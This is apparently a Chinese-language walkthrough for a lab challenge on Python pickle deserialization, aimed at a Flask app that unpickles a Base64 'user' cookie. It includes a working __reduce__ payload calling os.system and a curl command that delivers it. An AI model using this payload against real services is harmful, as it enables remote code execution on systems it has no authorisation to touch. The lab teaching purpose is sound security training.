# 090｜Python pickle 反序列化命令执行

- 题库端口：`8000`
- 无 CVE。未找到可确认属于本题 Vulfocus 镜像的专属题解；下列链来自同端口的公开 Flask pickle 靶场（Vulhub `python/unpickle`）。**入口未由本题资料证实**，先对照页面是否为 `Hello Guest`。[S1][S2]

## 一句话打法

若应用把 Cookie `user` 做 Base64 后 `pickle.loads`，则放入带 `__reduce__` 的序列化对象执行命令。[S1]

## 操作步骤

1. 访问 `http://<靶场IP>:8000/`。Vulhub 样例无 Cookie 时回 `Hello Guest`；能用合法 pickle 字典显示 `Hello <name>`。[S1]
2. 仅在确认 Cookie `user` → Base64 → `pickle.loads` 时发送（命令按目标替换）：[S1][S2]

   ```python
   import pickle, base64, os
   class Exp:
       def __reduce__(self):
           return (os.system, ("id",))
   print(base64.b64encode(pickle.dumps(Exp())).decode())
   ```

   ```powershell
   curl.exe -i -H "Cookie: user=<上一步Base64>" "http://<靶场IP>:8000/"
   ```

3. 公开样例把命令输出打到进程/反连，HTTP 仍可能是 `Hello Guest`（裸 `except`），不能单靠页面当成功信号。[S1]

## 本题特有排坑

- 不是“任意 Python 服务默认可 RCE”；必须确认不可信数据进入 `pickle.loads`/`load`。[S1]
- 题库未给路由/Cookie 名。Vulhub 用 `user` + 端口 `8000`，与本题端口一致但不能自动当成镜像接口。[S1]
- `__reduce__` 要返回 `(可调用对象, 参数元组)`；只传普通对象不会执行命令。[S2]

## 来源

- [S1] Vulhub 同类型环境说明：端口 8000、Cookie `user`、`Hello Guest`。详见[来源清单](../sources/090_python-pickle/_meta.md)。
- [S2] 原理说明：`__reduce__` → `os.system`。详见[来源清单](../sources/090_python-pickle/_meta.md)。
